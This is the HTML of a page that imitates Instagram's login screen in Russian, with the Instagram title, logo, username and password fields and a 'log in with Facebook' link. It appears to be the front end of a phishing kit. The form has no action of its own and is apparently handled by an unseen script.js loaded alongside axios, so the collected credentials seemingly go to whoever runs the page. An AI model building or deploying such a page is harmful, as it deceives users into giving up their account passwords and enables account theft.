<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram</title>
    <link rel="stylesheet" href="./css/style.css">
    <link rel="icon" href="./img/Instagram-Logo.wine.svg">
</head>
<body>
<div id="root">
    <div class="container">
        <div class="root">
            <div class="ins">
                <img src="./img/inss-removebg-preview.png" alt="">
            </div>
            <div class="ins-block">
                <form id="tg">
                    <div class="for-ins">
                        <input type="text" name="name" placeholder="Телефон,имя пользователя или эл.адрес" required/>
                    </div>

                    <div class="for-ins">
                        <input type="password" name="password" placeholder="Пароль" required/>
                    </div>

                    <button type="submit" class="btn">Войти</button>

                    <div class="title">
                        <p>Забыли данные для входа?<a href="#">Помощь со входом в систему</a></p>
                    </div>
                    <div class="icon">
                        <div class="icon--f">
                            <hr>
                            <h1>ИЛИ</h1>
                            <hr>
                        </div>

                        <div class='icon--g'>
                            <img src="./img/facebook-logo.png" alt="">
                            <a href="https://ru-ru.facebook.com/">Войти через Facebook</a>
                        </div>
                    </div>
                </form>

            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
<script src="js/script.js"></script>
</body>
</html>
